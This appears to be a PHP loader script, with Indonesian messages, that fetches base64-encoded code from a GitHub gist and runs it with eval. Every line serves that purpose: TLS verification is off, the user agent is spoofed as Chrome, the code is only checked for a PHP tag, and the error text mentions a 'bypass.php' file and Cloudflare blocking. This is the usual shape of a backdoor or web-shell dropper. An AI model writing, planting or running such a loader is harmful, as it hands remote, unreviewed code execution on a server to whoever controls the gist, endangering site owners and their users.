<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
if (!function_exists('curl_init')) {
    die("<div style='color:red; padding:20px; font-family:sans-serif;'><b>Error:</b> Ekstensi cURL tidak aktif di server ini.</div>");
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://gist.githubusercontent.com/faisalrohman/8c5c604feaee20c551a88125d0b5df16/raw/2da1d77d1a92c1965f9efddbf0b0e6c4f524a495/core.txt');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
curl_setopt($ch, CURLOPT_ENCODING, ''); // Otomatis un-compress GZIP/Deflate
curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

if(curl_errno($ch)){
    die("<div style='color:red; padding:20px; font-family:sans-serif;'><b>cURL Error:</b> " . curl_error($ch) . "</div>");
}
curl_close($ch);
$response = trim($response);
$kode_asli = base64_decode($response);
if ($http_code !== 200 || strpos($kode_asli, '<?php') === false) {
    echo "<div style='background:#fee2e2; border:1px solid #ef4444; color:#991b1b; padding:20px; font-family:sans-serif; border-radius:8px;'>";
    echo "<h3>Gagal Mengambil Kode Inti (HTTP $http_code)</h3>";
    echo "<p>Respons dari server <i>hanyauntukmu.my.id</i> tidak sesuai format yang diharapkan. Kemungkinan terblokir oleh sistem keamanan (Cloudflare) atau file bypass.php berisi error.</p>";
    echo "<b>Respons mentah dari server:</b><br>";
    echo "<textarea style='width:100%; height:150px; margin-top:10px; padding:10px; border-radius:4px; border:1px solid #fca5a5;'>".htmlspecialchars(substr($response, 0, 500))."...</textarea>";
    echo "</div>";
    die();
}
try {
    eval('?>' . $kode_asli);
} catch (Throwable $e) {
    echo "<div style='color:red; padding:20px; border:1px solid red; font-family:sans-serif;'>";
    echo "<b>Fatal Error saat mengeksekusi kode inti:</b> " . $e->getMessage() . "<br>";
    echo "Terjadi pada baris: " . $e->getLine();
    echo "</div>";
}
?>